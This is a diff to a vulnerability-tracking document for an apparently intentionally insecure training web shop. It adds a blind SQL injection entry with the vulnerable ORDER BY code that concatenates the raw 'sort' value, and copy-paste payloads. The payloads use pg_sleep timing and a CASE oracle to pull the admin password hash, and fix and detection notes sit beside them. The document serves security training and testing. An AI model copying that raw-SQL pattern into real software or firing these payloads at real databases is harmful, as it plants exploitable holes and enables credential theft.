@@ -7,10 +7,10 @@
 
 **Status legend:** 🔴 pending (not yet introduced) · 🟠 live on `main` (documented + exploit test) · 🟢 fixed on `fix/<slug>` (PR open, fixed test passing)
 
-> **Phase status:** Phase 3 in progress (Batch 1 = the injection + broken-auth
-> cluster). **3 of 24 live:** #1 SQLi (UNION), #2 SQLi (auth bypass), #4 broken
-> auth. Each has a passing exploit test in `server/tests/exploits/`. The rest are
-> still the secure Phase 2 baseline.
+> **Phase status:** Phase 3 in progress. **4 of 24 live:** #1 SQLi (UNION), #2
+> SQLi (auth bypass), #3 blind SQLi, #4 broken auth. Each has a passing exploit
+> test in `server/tests/exploits/` and a saved artifact in `artifacts/`. The rest
+> are still the secure Phase 2 baseline.
 
 ## Matrix
 
@@ -18,7 +18,7 @@
 |---|-----------|----------|------------|--------|
 | 1 | SQLi – UNION/data | `GET /api/search?q=` | `fix/sqli` | 🟠 live on `main` |
 | 2 | SQLi – auth bypass | `POST /api/auth/login` | `fix/sqli-login` | 🟠 live on `main` |
-| 3 | Blind SQLi (boolean/time) | `GET /api/products?sort=` | `fix/blind-sqli` | 🔴 pending |
+| 3 | Blind SQLi (boolean/time) | `GET /api/products?sort=` | `fix/blind-sqli` | 🟠 live on `main` |
 | 4 | Broken auth | login / register / seed | `fix/auth` | 🟠 live on `main` |
 | 5 | Broken access control (IDOR) | `GET /api/orders/:id`, `/messages/:id` | `fix/idor` | 🔴 pending |
 | 6 | Privilege escalation | `/api/admin/*` | `fix/authz-admin` | 🔴 pending |
@@ -99,8 +99,24 @@ the placeholders below reserve the slot and record the plan.
 - **Detect:** raw SQL in the auth path; login succeeding with a quote/`--` in the email field; failed-login count that doesn't match successes.
 - **Exploit test:** `server/tests/exploits/02-sqli-login-bypass.test.ts`
 
-### 3. Blind SQLi (boolean/time) — 🔴 pending
-_Batch 2 — `GET /api/products?sort=` raw ORDER BY._
+### 3. Blind SQLi (boolean/time) — 🟠 live on `main`
+- **Where:** `server/src/data/productRepo.ts` → `GET /api/products?sort=`
+- **Vulnerable code:**
+  ```ts
+  const orderBy = sort?.trim() || '"createdAt" DESC';
+  const sql = `SELECT * FROM "Product" WHERE (...) ORDER BY ${orderBy}`;
+  return prisma.$queryRawUnsafe(sql, `%${q}%`, category);
+  ```
+  (q/category are parameterized; only `sort` is concatenated — the injection is isolated to ORDER BY.)
+- **Exploit (copy-paste):**
+  ```
+  GET /api/products?sort=(SELECT 1 FROM pg_sleep(3))        → ~3s delay (time-based)
+  GET /api/products?sort=(CASE WHEN (SELECT substr(passwordHash,1,1) FROM "User" WHERE email='admin@kartly.test')='a' THEN name ELSE (SELECT 1 FROM pg_sleep(3)) END)
+  ```
+- **Impact:** No direct output, but boolean/time oracles extract any data one bit at a time (password hashes, secrets).
+- **Fix (`fix/blind-sqli`):** allowlist the sort column → concrete `ORDER BY`; never interpolate the raw value.
+- **Detect:** raw value in ORDER BY; response-time spikes correlated with `pg_sleep`/`CASE` in `sort`.
+- **Exploit test:** `server/tests/exploits/03-blind-sqli.test.ts`
 
 ### 4. Broken auth — 🟠 live on `main`
 - **Where:** `server/prisma/seed.ts`, `authService.register` / `resetPassword` (plaintext storage), no lockout.
